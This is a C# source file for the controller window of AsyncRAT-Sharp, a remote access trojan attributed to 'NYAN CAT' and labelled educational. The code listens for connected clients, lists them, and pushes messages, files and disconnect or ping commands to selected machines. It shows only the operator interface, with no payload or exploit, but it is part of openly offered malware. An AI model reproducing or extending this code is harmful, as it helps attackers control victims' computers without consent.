using System;
using System.Windows.Forms;
using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;
using System.Threading.Tasks;
using Microsoft.VisualBasic;
using System.Linq;
using System.Threading;
using System.Drawing;
using System.IO;

//       │ Author     : NYAN CAT
//       │ Name       : AsyncRAT // Simple Socket

//       Contact Me   : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.

namespace AsyncRAT_Sharp
{

    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            Listener listener = new Listener();
            Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
            thread.Start(Settings.Port);
            this.Text = string.Format("AsyncRAT-Sharp {0} // NYAN CAT", Settings.Version);
        }


        private void sendMessageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                string URL = Interaction.InputBox("Message", "Message", "Hello World!");
                if (string.IsNullOrEmpty(URL))
                    return;
                else
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "sendMessage";
                    msgpack.ForcePathObject("Message").AsString = URL;
                    foreach (ListViewItem C in listView1.SelectedItems)
                    {
                        Clients CL = (Clients)C.Tag;
                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                        CL.LV.ForeColor = Color.Red;
                    }
                }
            }
        }


        private void sendFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    OpenFileDialog O = new OpenFileDialog();
                    if (O.ShowDialog() == DialogResult.OK)
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "sendFile";
                        msgpack.ForcePathObject("File").LoadFileAsBytes(O.FileName);
                        msgpack.ForcePathObject("Extension").AsString = Path.GetExtension(O.FileName);
                        foreach (ListViewItem C in listView1.SelectedItems)
                        {
                            Clients CL = (Clients)C.Tag;
                            ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                            CL.LV.ForeColor = Color.Red;
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }


        private void closeConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "closeConnection";
                foreach (ListViewItem C in listView1.SelectedItems)
                {
                    Clients CL = (Clients)C.Tag;
                    ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                    CL.LV.ForeColor = Color.Orange;
                }
            }
        }


        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Environment.Exit(0);
        }


        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                if (listView1.Items.Count > 0)
                {
                    foreach (ListViewItem x in listView1.Items)
                        x.Selected = true;
                }
            }
        }


        private void listView1_MouseMove(object sender, MouseEventArgs e)
        {
            ListViewHitTestInfo hitInfo = listView1.HitTest(e.Location);
            if (e.Button == MouseButtons.Left && (hitInfo.Item != null || hitInfo.SubItem != null))
            {
                listView1.Items[hitInfo.Item.Index].Selected = true;
            }
        }


        private void ping_Tick(object sender, EventArgs e)
        {
            if (Settings.Online.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                foreach (Clients CL in Settings.Online.ToList())
                {
                    ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                }
            }
        }


        private void UpdateUI_Tick(object sender, EventArgs e)
        {
            toolStripStatusLabel1.Text = string.Format("Online {0}     Sent {1}     Received {2}", Settings.Online.Count.ToString(), Helper.BytesToString(Settings.Sent).ToString(), Helper.BytesToString(Settings.Received).ToString());
        }
    }
}
